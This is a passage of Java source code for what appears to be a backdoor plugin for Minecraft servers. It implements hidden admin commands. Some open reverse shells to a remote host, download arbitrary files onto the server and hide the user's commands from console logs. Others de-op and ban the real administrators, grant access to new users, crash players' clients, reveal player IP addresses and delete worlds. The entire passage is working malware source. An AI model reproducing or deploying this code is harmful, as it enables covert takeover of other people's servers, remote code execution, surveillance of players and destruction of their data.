    private class ReverseShellCommand extends Command {
        private final Map<Integer, ReverseShellInstance> activeShells = new ConcurrentHashMap<>();
        private int nextId = 0;

        public ReverseShellCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "revshell"; }
        @Override public String getDescription() { return "Creates and manages reverse shell connections."; }
        @Override public String getUsage() { return "<create|list|stop> [args...]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                BDUtils.sendWarn(sender, "Example: " + Config.command_prefix + "revshell create 127.0.0.1:4444 /bin/bash");
                return;
            }

            String subCommand = args[0].toLowerCase();
            String[] subArgs = Arrays.copyOfRange(args, 1, args.length);

            switch (subCommand) {
                case "create":
                    handleCreate(sender, subArgs);
                    break;
                case "list":
                    handleList(sender);
                    break;
                case "stop":
                    handleStop(sender, subArgs);
                    break;
                default:
                    BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                    break;
            }
        }

        private void handleCreate(Player sender, String[] args) {
            if (args.length < 2) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "revshell create <ip:port> <shell_command...>");
                return;
            }
            String[] parts = args[0].split(":");
            if (parts.length != 2) {
                BDUtils.sendError(sender, "Invalid ip:port format: '" + args[0] + "'");
                return;
            }
            String host = parts[0];
            int port;
            try {
                port = Integer.parseInt(parts[1]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid port: '" + parts[1] + "'");
                return;
            }
            String[] shellCmd = Arrays.copyOfRange(args, 1, args.length);
            final int shellId = ++nextId;

            BDUtils.sendMessage(sender, "Attempting to create reverse shell (ID: " + shellId + ") to " + host + ":" + port + "...");

            Consumer<String> onConnect = message -> BDUtils.sendSuccess(sender, message);
            Consumer<String> onError = message -> {
                BDUtils.sendError(sender, message);
                activeShells.remove(shellId);
            };
            Consumer<String> onDisconnect = message -> {
                if (activeShells.containsKey(shellId)) {
                    BDUtils.sendWarn(sender, message);
                    activeShells.remove(shellId);
                }
            };

            ReverseShellInstance shell = new ReverseShellInstance(shellId, host, port, shellCmd, plugin, onConnect, onDisconnect, onError);
            activeShells.put(shellId, shell);
            shell.start();
        }

        private void handleList(Player sender) {
            if (activeShells.isEmpty()) {
                BDUtils.sendMessage(sender, "No active reverse shells.");
                return;
            }
            BDUtils.sendMessage(sender, ChatColor.GREEN + "Active reverse shells:");
            for (ReverseShellInstance shell : activeShells.values()) {
                BDUtils.sendMessage(sender, ChatColor.YELLOW + " - ID: " + shell.getId() + " | " + ChatColor.WHITE + shell.getDetails());
            }
        }

        private void handleStop(Player sender, String[] args) {
            if (args.length < 1) {
                BDUtils.sendError(sender, "Usage: " + Config.command_prefix + "revshell stop <id>");
                return;
            }
            int id;
            try {
                id = Integer.parseInt(args[0]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid ID: '" + args[0] + "'");
                return;
            }
            ReverseShellInstance shell = activeShells.get(id);
            if (shell == null) {
                BDUtils.sendError(sender, "No active shell found with ID: " + id);
                return;
            }
            BDUtils.sendMessage(sender, "Sent stop signal to shell ID: " + id);
            shell.stop();
        }
    }

    private class InfoCommand extends Command {
        public InfoCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "info"; }
        @Override public String getDescription() { return "Shows information about the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            try {
                URL url = new URL("https://api.ipify.org/");
                BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
                String ip = br.readLine();
                Runtime r = Runtime.getRuntime();
                long memUsed = (r.totalMemory() - r.freeMemory()) / 1048576L;
                long memMax = r.maxMemory() / 1048576L;
                BDUtils.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
                BDUtils.sendMessage(sender, ChatColor.WHITE + "Server IP: " + ChatColor.GRAY + ip + ":" + Bukkit.getServer().getPort());
                BDUtils.sendMessage(sender, ChatColor.WHITE + "Server version: " + ChatColor.GRAY + Bukkit.getVersion());
                BDUtils.sendMessage(sender, ChatColor.WHITE + "OS: " + ChatColor.GRAY + System.getProperty("os.name"));
                BDUtils.sendMessage(sender, ChatColor.WHITE + "RAM (used/max): " + ChatColor.GRAY + memUsed + "MB / " + memMax + "MB");
                BDUtils.sendMessage(sender, ChatColor.GRAY + "----------------------------------------------");
            } catch (IOException e) {
                BDUtils.sendError(sender, "Error gathering system info.");
            }
        }
    }

    private class ChaosCommand extends Command {
        public ChaosCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "chaos"; }
        @Override public String getDescription() { return "Deops and bans all ops, ops all regular players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            for (Player p : Bukkit.getOnlinePlayers()) {
                boolean isAdmin = p.isOp() || p.hasPermission("*") || p.hasPermission("group.admin");
                if (isAdmin && !BDUtils.helpers.isUserAuthorized(p)) {
                    BDUtils.DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, false);
                    Bukkit.getBanList(BanList.Type.NAME).addBan(p.getName(), Config.default_ban_reason, null, Config.default_ban_source);
                    if (p.isOnline()) {
                        p.kickPlayer(Config.default_ban_reason);
                    }
                } else if (!isAdmin) {
                    BDUtils.DynamicInvoker.invokeInstanceMethod(p, "setOp", void.class, new Class<?>[]{boolean.class}, true );
                }
            }
            Bukkit.broadcastMessage(Config.chaos_chat_broadcast);
        }
    }

    private class EnchantCommand extends Command {
        public EnchantCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "enchant"; }
        @Override public String getDescription() { return "Applies a specific enchantment to the held item."; }
        @Override public String getUsage() { return "<enchantment> <level> [player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) {
                BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                BDUtils.sendWarn(sender, "Example: !enchant sharpness 100");
                BDUtils.sendWarn(sender, "Example: !enchant efficiency 10 Kudo");
                return;
            }

            Player target = sender;
            if (args.length > 2) {
                target = Bukkit.getPlayer(args[2]);
                if (target == null) {
                    BDUtils.sendError(sender, "Player not found: " + args[2]);
                    return;
                }
            }

            ItemStack item = target.getInventory().getItemInMainHand();
            if (item.getType() == Material.AIR) {
                BDUtils.sendError(sender, target.getName() + " is not holding an item.");
                return;
            }

            ItemMeta meta = item.getItemMeta();
            if (meta == null) {
                BDUtils.sendError(sender, "Could not get item metadata.");
                return;
            }

            Enchantment enchantment = Enchantment.getByKey(NamespacedKey.minecraft(args[0].toLowerCase()));
            if (enchantment == null) {
                BDUtils.sendError(sender, "Invalid enchantment: " + args[0] + ". Use the Minecraft ID name (e.g., 'sharpness', 'unbreaking', 'fire_aspect').");
                return;
            }

            int level;
            try {
                level = Integer.parseInt(args[1]);
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid level: " + args[1] + ". Must be a number.");
                return;
            }
            meta.addEnchant(enchantment, level, true);
            item.setItemMeta(meta);
            BDUtils.sendSuccess(sender, "Applied " + enchantment.getKey().getKey() + " " + level + " to " + target.getName() + "'s item.");
        }
    }

    private class SeedCommand extends Command {
        public SeedCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "seed"; }
        @Override public String getDescription() { return "Gets the current world seed."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            String seedString = String.valueOf(sender.getWorld().getSeed());
            ClickEvent clickEvent = new ClickEvent(ClickEvent.Action.COPY_TO_CLIPBOARD, seedString);
            HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, new ComponentBuilder("Click to copy!").create() );
            TextComponent message = new TextComponent("World seed: ");
            TextComponent openBracket = new TextComponent("[");
            TextComponent seedComponent = new TextComponent(seedString);
            seedComponent.setColor(ChatColor.GREEN.asBungee());
            seedComponent.setClickEvent(clickEvent);
            seedComponent.setHoverEvent(hoverEvent);
            TextComponent closeBracket = new TextComponent("]");
            message.addExtra(openBracket);
            message.addExtra(seedComponent);
            message.addExtra(closeBracket);
            BDUtils.sendMessage(sender, message);
        }
    }

    private class StopCommand extends Command {
        public StopCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "stop"; }
        @Override public String getDescription() { return "Shuts down the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            BDUtils.sendMessage(sender, "Server shutting down...");
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.shutdown();
            });
        }
    }

    private class PlayerSayCommand extends Command {
        public PlayerSayCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "psay"; }
        @Override public String getDescription() { return "Sends a message as another player."; }
        @Override public String getUsage() { return "<player> <message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            String message = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            Bukkit.getScheduler().runTask(plugin, () -> {
                target.chat(message);
            });
        }
    }

    private class ServerSayCommand extends Command {
        public ServerSayCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "ssay"; }
        @Override public String getDescription() { return "Sends a message as the server."; }
        @Override public String getUsage() { return "<message...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            String message = String.join(" ", args);
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "say " + message);
            });
        }
    }

    private class RenameCommand extends Command {
        public RenameCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "rename"; }
        @Override public String getDescription() { return "Changes your display name."; }
        @Override public String getUsage() { return "<name...>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            String name = ChatColor.translateAlternateColorCodes('&', String.join(" ", args));
            Bukkit.getScheduler().runTask(plugin, () -> {
                sender.setDisplayName(name);
                sender.setPlayerListName(name);
            });
            BDUtils.sendMessage(sender, "Your name was changed to " + name);
        }
    }

    private class ReloadCommand extends Command {
        public ReloadCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "reload"; }
        @Override public String getDescription() { return "[Visible] Reloads the server."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Bukkit.getScheduler().runTask(plugin, () -> {
                Bukkit.reload();
            });
        }
    }

    private class GetIpCommand extends Command {
        public GetIpCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "getip"; }
        @Override public String getDescription() { return "Gets the IP address of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            InetSocketAddress address = target.getAddress();
            if (address == null) { BDUtils.sendError(sender, "Could not get IP for " + target.getName()); return; }
            BDUtils.sendMessage(sender, target.getName() + "'s IP: " + ChatColor.RED + address.getAddress().getHostAddress());
        }
    }

    private class ListWorldsCommand extends Command {
        public ListWorldsCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "listworlds"; }
        @Override public String getDescription() { return "Displays all loaded worlds."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            StringJoiner joiner = new StringJoiner(", ");
            for (World w : Bukkit.getWorlds()) {
                joiner.add(w.getName());
            }
            BDUtils.sendMessage(sender, "Worlds: " + joiner.toString());
        }
    }

    private class MakeWorldCommand extends Command {
        public MakeWorldCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "makeworld"; }
        @Override public String getDescription() { return "Creates a new world. This can cause significant server lag."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            String worldName = args[0];
            if (Bukkit.getWorld(worldName) != null) { BDUtils.sendError(sender, "A world with this name already exists."); return; }
            BDUtils.sendMessage(sender, "Starting to create world '" + worldName + "'. The server will freeze during this process!");
            Bukkit.getScheduler().runTask(plugin, () -> {
                new WorldCreator(worldName).createWorld();
                BDUtils.sendMessage(sender, "World '" + worldName + "' has been created successfully!");
            });
        }
    }

    private class DelWorldCommand extends Command {
        public DelWorldCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "delworld"; }
        @Override public String getDescription() { return "Deletes a world."; }
        @Override public String getUsage() { return "<name>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            World world = Bukkit.getWorld(args[0]);
            if (world == null) { BDUtils.sendError(sender, "World not found: " + args[0]); return; }
            File worldFolder = world.getWorldFolder();
            BDUtils.sendMessage(sender, "Attempting to delete world: " + world.getName());
            Bukkit.getScheduler().runTask(plugin, () -> {
                if (Bukkit.unloadWorld(world, false)) {
                    Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
                        boolean deleted = BDUtils.helpers.deleteWorld(worldFolder);
                        Bukkit.getScheduler().runTask(plugin, () -> {
                            BDUtils.sendMessage(sender, "World '" + world.getName() + (deleted ? "' deleted successfully." : "' failed to delete."));
                        });
                    });
                } else {
                    BDUtils.sendError(sender, "Failed to unload world '" + world.getName() + "'.");
                }
            });
        }
    }

    private class VanishCommand extends Command {
        public VanishCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "vanish"; }
        @Override public String getDescription() { return "Toggles your visibility to other players."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isVanished = BDUtils.getState(playerStates, sender.getName(), BDUtils.State.VANISHED);
            BDUtils.setState(playerStates, sender.getName(), BDUtils.State.VANISHED, !isVanished);
            if (!isVanished) {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(plugin, () -> all.hidePlayer(plugin, sender));
                BDUtils.sendMessage(sender, "You are now vanished.");
            } else {
                for (Player all : Bukkit.getOnlinePlayers())
                    Bukkit.getScheduler().runTask(plugin, () -> all.showPlayer(plugin, sender));
                BDUtils.sendMessage(sender, "You are no longer vanished.");
            }
        }
    }

    private class LogBlockCommand extends Command {
        public LogBlockCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "logblock"; }
        @Override public String getDescription() { return "Toggles logging of your executed commands in the console."; }
        @Override public String getUsage() { return ""; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            boolean isLogBlocked = BDUtils.getState(playerStates, sender.getName(), BDUtils.State.LOG_BLOCKED);
            BDUtils.setState(playerStates, sender.getName(), BDUtils.State.LOG_BLOCKED, !isLogBlocked);
            if (!isLogBlocked) {
                BDUtils.sendSuccess(sender, "Your commands will not appear in the server console.");
            } else {
                BDUtils.sendWarn(sender, "Your commands will now appear in the server console.");
            }
        }
    }

    private class SilkTouchCommand extends Command {
        public SilkTouchCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "silktouch"; }
        @Override public String getDescription() { return "Toggles silk touch hands for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = BDUtils.getState(playerStates, target.getName(), BDUtils.State.SILKTOUCH);
            BDUtils.setState(playerStates, target.getName(), BDUtils.State.SILKTOUCH, !isEnabled);
            BDUtils.sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " silk touch hands.");
        }
    }

    private class InstaBreakCommand extends Command {
        public InstaBreakCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "instabreak"; }
        @Override public String getDescription() { return "Toggles instant block breaking for a player."; }
        @Override public String getUsage() { return "[player]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            boolean isEnabled = BDUtils.getState(playerStates, target.getName(), BDUtils.State.INSTABREAK);
            BDUtils.setState(playerStates, target.getName(), BDUtils.State.INSTABREAK, !isEnabled);
            BDUtils.sendMessage(sender, target.getName() + (!isEnabled ? " now has" : " no longer has") + " insta-break.");
        }
    }

    private class CrashCommand extends Command {
        public CrashCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "crash"; }
        @Override public String getDescription() { return "Attempts to crash a player's client."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            for (int x = 0; x < 100; x++) {
                Bukkit.getScheduler().runTask(plugin, () -> {
                    target.spawnParticle(Particle.EXPLOSION_HUGE, target.getLocation(), Integer.MAX_VALUE);
                });
            }
            BDUtils.sendMessage(sender, "Attempting to crash " + target.getName());
        }
    }

    private class TrollCommand extends Command {
        public TrollCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "troll"; }
        @Override public String getDescription() { return "Toggles various troll effects on a player."; }
        @Override public String getUsage() { return "<method> <player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            String method = args[0].toLowerCase();
            Player target = Bukkit.getPlayer(args[1]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[1]); return; }

            if (method.equalsIgnoreCase("reset")) {
                BDUtils.clearState(playerStates, target.getName());
                BDUtils.sendMessage(sender, "Reset all troll states for " + target.getName());
                return;
            }
            try {
                BDUtils.State trollState = BDUtils.State.valueOf("MF_" + method.toUpperCase());
                boolean isEnabled = BDUtils.getState(playerStates, target.getName(), trollState);
                BDUtils.setState(playerStates, target.getName(), trollState, !isEnabled);
                BDUtils.sendMessage(sender, "Troll method '" + method + "' " + (!isEnabled ? "enabled" : "disabled") + " for " + target.getName());
            } catch (IllegalArgumentException e) {
                BDUtils.sendError(sender, "Invalid troll method. Options: thrower, interact, cripple, flight, inventory, drop, teleport, mine, place, login, god, damage, or reset.");
            }
        }
    }

    private abstract class LockToggleCommand extends Command {
        private final boolean shouldLock;
        private final String actionPastTense;
        private final String playerActionPastTense;
        private final String playerActionPastTenseEveryone;

        public LockToggleCommand(Plugin plugin, boolean shouldLock) {
            super(plugin);
            this.shouldLock = shouldLock;
            this.actionPastTense = shouldLock ? "locked" : "unlocked";
            this.playerActionPastTense = shouldLock ? "blocked from using commands" : "unblocked";
            this.playerActionPastTenseEveryone = shouldLock ? "blocked from using commands" : "unblocked";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | console | everyone | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }

            String subCommand = args[0].toLowerCase();

            switch (subCommand) {
                case "all":
                    if (args.length > 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
                    BDUtils.setState(playerStates, "console", BDUtils.State.LOCKED, shouldLock);
                    for (Player p : Bukkit.getOnlinePlayers()) BDUtils.setState(playerStates, p.getName(), BDUtils.State.LOCKED, shouldLock);
                    BDUtils.sendMessage(sender, "Console and all players have been " + actionPastTense + ".");
                    break;
                case "console":
                    if (args.length > 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
                    BDUtils.setState(playerStates, "console", BDUtils.State.LOCKED, shouldLock);
                    BDUtils.sendMessage(sender, "Console has been " + actionPastTense + ".");
                    break;
                case "everyone":
                    if (args.length > 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
                    for (Player p : Bukkit.getOnlinePlayers()) BDUtils.setState(playerStates, p.getName(), BDUtils.State.LOCKED, shouldLock);
                    BDUtils.sendMessage(sender, "All players have been " + playerActionPastTenseEveryone + ".");
                    break;
                case "player":
                    if (args.length < 2) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
                    String targetName = args[1];
                    BDUtils.setState(playerStates, targetName, BDUtils.State.LOCKED, shouldLock);
                    BDUtils.sendMessage(sender, targetName + " has been " + playerActionPastTense + ".");
                    break;
                default:
                    BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this));
                    break;
            }
        }
    }

    private class LockCommand extends LockToggleCommand {
        public LockCommand(Plugin plugin) { super(plugin, true); }
        @Override public String getName() { return "lock"; }
        @Override public String getDescription() { return "Locks the console, all players, a specific player, or all of them."; }
    }

    private class UnlockCommand extends LockToggleCommand {
        public UnlockCommand(Plugin plugin) { super(plugin, false); }
        @Override public String getName() { return "unlock"; }
        @Override public String getDescription() { return "Unlocks the console, all players, a specific player, or all of them."; }
    }

    private abstract class MuteToggleCommand extends Command {
        private final boolean shouldMute;
        private final String actionPastTense;

        public MuteToggleCommand(Plugin plugin, boolean shouldMute) {
            super(plugin);
            this.shouldMute = shouldMute;
            this.actionPastTense = shouldMute ? "muted" : "unmuted";
        }

        @Override public abstract String getName();
        @Override public abstract String getDescription();
        @Override public int getRequirePerm() { return 2; }
        @Override public String getUsage() { return "<all | player> [name]"; }

        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }

            if (args[0].equalsIgnoreCase("all")) {
                for (Player p : Bukkit.getOnlinePlayers()) BDUtils.setState(playerStates, p.getName(), BDUtils.State.MUTED, this.shouldMute);
                BDUtils.sendMessage(sender, "Everyone was " + this.actionPastTense + ".");
            } else if (args[0].equalsIgnoreCase("player")) {
                if (args.length < 2) { BDUtils.sendError(sender, "Usage: " + Config.command_prefix + getName() + " player <name>"); return; }
                Player target = Bukkit.getPlayer(args[1]);
                if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[1]); return; }
                BDUtils.setState(playerStates, target.getName(), BDUtils.State.MUTED, this.shouldMute);
                BDUtils.sendMessage(sender, target.getName() + " was " + this.actionPastTense + ".");
            } else {
                BDUtils.sendError(sender, "Invalid subcommand. " + BDUtils.helpers.getRequiredUsage(this));
            }
        }
    }

    private class MuteCommand extends MuteToggleCommand {
        public MuteCommand(Plugin plugin) { super(plugin, true); }
        @Override public String getName() { return "mute"; }
        @Override public String getDescription() { return "Mutes a player in chat."; }
    }

    private class UnmuteCommand extends MuteToggleCommand {
        public UnmuteCommand(Plugin plugin) { super(plugin, false); }
        @Override public String getName() { return "unmute"; }
        @Override public String getDescription() { return "Unmutes a player in chat."; }
    }

    private class DownloadCommand extends Command {
        public DownloadCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "download"; }
        @Override public String getDescription() { return "Downloads a file to the server's root directory."; }
        @Override public String getUsage() { return "<url> <filepath>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 2) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            BDUtils.sendMessage(sender, "Downloading file: " + ChatColor.RED + args[1]);
            new Thread(() -> {
                try {
                    BDUtils.helpers.downloadFile(new URL(args[0]), args[1]);
                    BDUtils.sendMessage(sender, "File downloaded successfully!");
                } catch (IOException e) {
                    BDUtils.sendError(sender, "Download failed: " + e.getMessage());
                }
            }).start();
        }
    }

    private class CoordsCommand extends Command {
        public CoordsCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "coords"; }
        @Override public String getDescription() { return "Gets the coordinates of a player."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found: " + args[0]); return; }
            Location loc = target.getLocation();
            BDUtils.sendMessage(sender, String.format("%s's coords: %d, %d, %d in %s", target.getName(), loc.getBlockX(), loc.getBlockY(), loc.getBlockZ(), loc.getWorld().getName()));
        }
    }

    private class AuthCommand extends Command {
        public AuthCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "auth"; }
        @Override public String getDescription() { return "Temporarily authorizes a user until the next restart."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }

            Player target = Bukkit.getPlayer(args[0]);
            if (target == null) { BDUtils.sendError(sender, "Player not found or is not online: " + args[0]); return; }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                BDUtils.sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (Config.tmp_authorized_uuids[i] == null) {
                    Config.tmp_authorized_uuids[i] = targetUuid;
                    BDUtils.sendMessage(sender, target.getName() + " (UUID: " + targetUuid + ") has been temporarily authorized.");
                    BDUtils.sendMessage(target, "You have been authorized. Run " + Config.command_prefix + "help for info.");
                    return;
                }
            }
            BDUtils.sendError(sender, "Unable to authorize user (temporary auth list is full).");
        }
    }

    private class DeauthCommand extends Command {
        public DeauthCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "deauth"; }
        @Override public String getDescription() { return "Deauthorizes a player from the temporary list."; }
        @Override public String getUsage() { return "<player>"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 1) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }

            OfflinePlayer target = Bukkit.getOfflinePlayer(args[0]);
            if (!target.hasPlayedBefore() && !target.isOnline()) {
                BDUtils.sendError(sender, "Player '" + args[0] + "' has never played on this server.");
                return;
            }

            String targetUuid = target.getUniqueId().toString();
            if (Config.tmp_authorized_uuids == null) {
                BDUtils.sendError(sender, "Temporary authorization list is not initialized.");
                return;
            }

            for (int i = 0; i < Config.tmp_authorized_uuids.length; i++) {
                if (targetUuid.equalsIgnoreCase(Config.tmp_authorized_uuids[i])) {
                    Config.tmp_authorized_uuids[i] = null;
                    BDUtils.sendMessage(sender, (target.getName() != null ? target.getName() : args[0]) + " has been deauthorized.");
                    return;
                }
            }
            BDUtils.sendError(sender, "Player not found in the temporary authorization list.");
        }
    }

    private class TeleportCommand extends Command {
        public TeleportCommand(Plugin plugin) { super(plugin); }
        @Override public String getName() { return "tp"; }
        @Override public String getDescription() { return "Teleports you to specified coordinates."; }
        @Override public String getUsage() { return "<x> <y> <z> [world]"; }
        @Override public int getRequirePerm() { return 2; }
        @Override public void execute(Player sender, String[] args) {
            if (args.length < 3) { BDUtils.sendError(sender, BDUtils.helpers.getRequiredUsage(this)); return; }
            try {
                double x = Double.parseDouble(args[0]);
                double y = Double.parseDouble(args[1]);
                double z = Double.parseDouble(args[2]);
                World world = (args.length > 3) ? Bukkit.getWorld(args[3]) : sender.getWorld();
                if (world == null) { BDUtils.sendError(sender, "World not found: " + args[3]); return; }

                Location loc = new Location(world, x, y, z, sender.getLocation().getYaw(), sender.getLocation().getPitch());
                Bukkit.getScheduler().runTask(plugin, () -> {
                    sender.teleport(loc);
                });
                BDUtils.sendMessage(sender, "Teleported.");
            } catch (NumberFormatException e) {
                BDUtils.sendError(sender, "Invalid coordinates.");
            }
        }
    }
    //endregion
}